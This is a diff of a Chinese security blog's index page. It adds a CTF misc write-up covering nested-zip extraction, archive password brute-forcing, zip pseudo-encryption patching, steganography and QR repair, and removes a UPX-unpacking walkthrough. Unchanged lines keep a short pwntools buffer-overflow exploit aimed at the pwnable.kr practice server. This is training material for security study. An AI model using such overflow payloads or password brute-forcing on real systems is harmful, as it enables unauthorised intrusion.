@@ -204,6 +204,190 @@
   
 
   <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/08/07/%E6%9A%B4%E9%BE%99%E6%9D%AFwp(misc)/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/head.png">
+      <meta itemprop="name" content="R3ape1">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="230">
+      <meta itemprop="description" content="青年们要充分认识自己所负的重任">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="undefined | 230">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2022/08/07/%E6%9A%B4%E9%BE%99%E6%9D%AFwp(misc)/" class="post-title-link" itemprop="url">暴龙杯wp(misc)</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+      
+
+      <time title="创建时间：2022-08-07 15:07:00 / 修改时间：15:08:29" itemprop="dateCreated datePublished" datetime="2022-08-07T15:07:00+08:00">2022-08-07</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/%E6%AF%94%E8%B5%9B/" itemprop="url" rel="index"><span itemprop="name">比赛</span></a>
+        </span>
+          ，
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/%E6%AF%94%E8%B5%9B/2022/" itemprop="url" rel="index"><span itemprop="name">2022</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <p>签到</p>
+<p>下下来一个压缩包，一张png图片，拖到浏览器中发现是apng，用工具分离出来就好</p>
+<img src="/2022/08/07/%E6%9A%B4%E9%BE%99%E6%9D%AFwp(misc)/clip_image002.gif" class="" title="图片">
+
+<p>得到flag，BLCTF{Y0u_Kn0w_Apng!!!!!}</p>
+<p>Ez_zip</p>
+<p>打开发现是一个无限套娃的压缩包，直接用脚本跑</p>
+<p>from zipfile import *</p>
+<p>from os import *</p>
+<p>init_name &#x3D; ‘98895’</p>
+<p>name_list &#x3D; []</p>
+<p>path &#x3D; getcwd()</p>
+<p>zip_name &#x3D; init_name</p>
+<p>while True:</p>
+<p>  try:</p>
+<p>   name_list.append(zip_name)</p>
+<p>   file &#x3D; ZipFile(zip_name+’.zip’, ‘r’)</p>
+<p>   if(file):</p>
+<p>​     file.extractall(path, pwd&#x3D;zip_name.encode(‘utf-8’))</p>
+<p>​     zip_name &#x3D; file.namelist()[0][:-4]</p>
+<p>   else:</p>
+<p>​     continue</p>
+<p>  except:</p>
+<p>   break</p>
+<p>print(name_list)</p>
+<p>跑出来最后一个flag.zip,发现是加密文件，调整长度进行爆破</p>
+<img src="/2022/08/07/%E6%9A%B4%E9%BE%99%E6%9D%AFwp(misc)/clip_image004.gif" class="" title="图片">
+
+<p>发现密码是999999，解压出来一个flag.png拖入浏览器发现还是apng，分离</p>
+<img src="/2022/08/07/%E6%9A%B4%E9%BE%99%E6%9D%AFwp(misc)/clip_image006.gif" class="" title="图片">
+
+<p>得flag，BLCTF{731b9cdf-6022-4429-8949-b1e4a757db30}</p>
+<p>嫌疑人X</p>
+<p>首先打开压缩包，会发现info文件夹下有个隐藏文件，把隐藏按钮打开就好</p>
+<img src="/2022/08/07/%E6%9A%B4%E9%BE%99%E6%9D%AFwp(misc)/clip_image008.gif" class="" title="图片">
+
+<p>发现这个诺基亚.rar和上一级文件夹中pcap.rar都是加密文件</p>
+<p>看了看发现只有一张证件照是有相关信息的</p>
+<img src="/2022/08/07/%E6%9A%B4%E9%BE%99%E6%9D%AFwp(misc)/clip_image010.gif" class="" title="图片">
+
+<p>根据一般的密码的设置套路，名字+生日，试了好久还是试不出，根据提示知道了诺基亚的密码是Lx1x9x0x0x</p>
+<p>立马想到密码是Lw19970608</p>
+<p>解开诺基亚.rar</p>
+<img src="/2022/08/07/%E6%9A%B4%E9%BE%99%E6%9D%AFwp(misc)/clip_image012.gif" class="" title="图片">
+
+<p>是一张诺基亚的照片，拖进winhex看看</p>
+<img src="/2022/08/07/%E6%9A%B4%E9%BE%99%E6%9D%AFwp(misc)/clip_image014.gif" class="" title="图片">
+
+<p>发现有个压缩包，foremost分离出来，发现要密码</p>
+<p>winhex修改伪加密</p>
+<img src="/2022/08/07/%E6%9A%B4%E9%BE%99%E6%9D%AFwp(misc)/clip_image016.gif" class="" title="图片">
+
+<p>打开秘密.txt发现是九键键盘解密</p>
+<img src="/2022/08/07/%E6%9A%B4%E9%BE%99%E6%9D%AFwp(misc)/clip_image018.gif" class="" title="图片">
+
+<p>对照着那张诺基亚三个五代表l，四个七代表s，以此类推，出来的结果是</p>
+<p>lsjddwyyyyy，这一看就是另一个rar的密码了</p>
+<p>wireshark分析pcapng文件</p>
+<p>在udp追踪流0的时候发现flag</p>
+<img src="/2022/08/07/%E6%9A%B4%E9%BE%99%E6%9D%AFwp(misc)/clip_image020.gif" class="" title="图片">
+
+<p>最终答案是BLCTF{YOU_ARE_A_GREAT_ASSISTANT}</p>
+<p>BitMask</p>
+<p>压缩包直接是加密的，根据注释提示是六位密码</p>
+<img src="/2022/08/07/%E6%9A%B4%E9%BE%99%E6%9D%AFwp(misc)/clip_image022.gif" class="" title="图片">
+
+<p>直接先六位纯数字爆破</p>
+<img src="/2022/08/07/%E6%9A%B4%E9%BE%99%E6%9D%AFwp(misc)/clip_image024.gif" class="" title="图片">
+
+<p>密码是21964</p>
+<img src="/2022/08/07/%E6%9A%B4%E9%BE%99%E6%9D%AFwp(misc)/clip_image026.gif" class="" title="图片">
+
+<p>发现了被污染的二维码，用网站手拼二维码进行扫描</p>
+<p><a target="_blank" rel="noopener" href="https://merricx.github.io/qrazybox/">https://merricx.github.io/qrazybox/</a></p>
+<img src="/2022/08/07/%E6%9A%B4%E9%BE%99%E6%9D%AFwp(misc)/clip_image028.gif" class="" title="图片">
+
+<img src="/2022/08/07/%E6%9A%B4%E9%BE%99%E6%9D%AFwp(misc)/clip_image030.gif" class="" title="图片">
+
+<p>解出457c，把原图zsteg的时候发现应该里面还有一张图片，但是分离不出来</p>
+<img src="/2022/08/07/%E6%9A%B4%E9%BE%99%E6%9D%AFwp(misc)/clip_image032.gif" class="" title="图片">
+
+<p>猜测是有损坏，放入winhex搜索IEND</p>
+<img src="/2022/08/07/%E6%9A%B4%E9%BE%99%E6%9D%AFwp(misc)/clip_image034.gif" class="" title="图片">
+
+<p>第一个IEND处发现png的文件头没有补齐，将它分离出来并且用8950补齐头部</p>
+<img src="/2022/08/07/%E6%9A%B4%E9%BE%99%E6%9D%AFwp(misc)/clip_image036.gif" class="" title="图片">
+
+<p>保存下来一张新的二维码，发现扫不了，应该是对掩码进行了调整</p>
+<p>还是用之前的那个网站对新保存下来的这张二维码进行掩码修复，顺序是076</p>
+<img src="/2022/08/07/%E6%9A%B4%E9%BE%99%E6%9D%AFwp(misc)/clip_image038.gif" class="" title="图片">
+
+<p>扫出来的结果是前半截的flag，在原图binwalk的时候发现1675这个文件用记事本打开的时候是一串编码</p>
+<img src="/2022/08/07/%E6%9A%B4%E9%BE%99%E6%9D%AFwp(misc)/clip_image040.gif" class="" title="图片">
+
+<img src="/2022/08/07/%E6%9A%B4%E9%BE%99%E6%9D%AFwp(misc)/clip_image042.gif" class="" title="图片">
+
+<p>对编码进行解码，将该二进制从头部一位一位剔除进行二进制转换</p>
+<img src="/2022/08/07/%E6%9A%B4%E9%BE%99%E6%9D%AFwp(misc)/clip_image044.gif" class="" title="图片">
+
+<p>得到flag后半部分，拼接起来BLCTF{675af7c9-fb5b-xxxx-9fde-415a5253db08}</p>
+<p>想到之前有个手拼扫描出来的四位数457c，应该就是这四个xxxx了，拼接起来得flag</p>
+<p>BLCTF{675af7c9-fb5b-457c-9fde-415a5253db08}</p>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
     <link itemprop="mainEntityOfPage" href="http://example.com/2022/08/06/bugku_%E7%A7%8B%E5%90%8D%E5%B1%B1%E8%BD%A6%E7%A5%9E/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1435,108 +1619,6 @@
 <h1 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = remote(<span class="string">&#x27;pwnable.kr&#x27;</span>, <span class="number">9000</span>)</span><br><span class="line">value = <span class="number">0xCAFeBABe</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">52</span> + p32(value)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
 
 
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2022/07/12/flag(wp)/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/head.png">
-      <meta itemprop="name" content="R3ape1">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="230">
-      <meta itemprop="description" content="青年们要充分认识自己所负的重任">
-    </span>
-
-    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content="undefined | 230">
-      <meta itemprop="description" content="">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/2022/07/12/flag(wp)/" class="post-title-link" itemprop="url">flag</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">发表于</span>
-      
-
-      <time title="创建时间：2022-07-12 19:46:00 / 修改时间：19:47:26" itemprop="dateCreated datePublished" datetime="2022-07-12T19:46:00+08:00">2022-07-12</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-folder"></i>
-      </span>
-      <span class="post-meta-item-text">分类于</span>
-        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/%E5%88%B7%E9%A2%98/" itemprop="url" rel="index"><span itemprop="name">刷题</span></a>
-        </span>
-          ，
-        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/%E5%88%B7%E9%A2%98/pwnable%E5%88%B7%E9%A2%98/" itemprop="url" rel="index"><span itemprop="name">pwnable刷题</span></a>
-        </span>
-    </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <h1 id="题目简介"><a href="#题目简介" class="headerlink" title="题目简介"></a>题目简介</h1><p>这是一道需要逆向脱壳的题</p>
-<h1 id="解题流程"><a href="#解题流程" class="headerlink" title="解题流程"></a>解题流程</h1><h2 id="静态分析"><a href="#静态分析" class="headerlink" title="静态分析"></a>静态分析</h2><p>将下载下来的二进制文件拖入ida查看</p>
-<img src="/2022/07/12/flag(wp)/image-20220712192048750.png" class="" title="image-20220712192048750">
-
-<p>看到只有三个函数，很明显是被加壳了。</p>
-<p>在hex视图中进入一个函数，可以看到下图所示的字段</p>
-<img src="/2022/07/12/flag(wp)/image-20220712192148939.png" class="" title="image-20220712192148939">
-
-<p>现在可以确定这个二进制程序是被UPX加壳了，接下来只是需要将这个二进制文件脱壳，再用ida查看。</p>
-<h2 id="脱壳分析"><a href="#脱壳分析" class="headerlink" title="脱壳分析"></a>脱壳分析</h2><p>upx的安装这里不多赘述，主要是两个指令</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">upx -d filename #脱壳</span><br><span class="line">upx filename #加壳</span><br></pre></td></tr></table></figure>
-
-
-
-<p>脱壳后再拖入ida就可以看到很多函数，进入main函数查看，如下图所示</p>
-<img src="/2022/07/12/flag(wp)/image-20220712193403427.png" class="" title="image-20220712193403427">
-
-
-
-<p>跟进到data段就可以看到flag的值</p>
-<img src="/2022/07/12/flag(wp)/image-20220712193553553.png" class="" title="image-20220712193553553">
       
     </div>
 
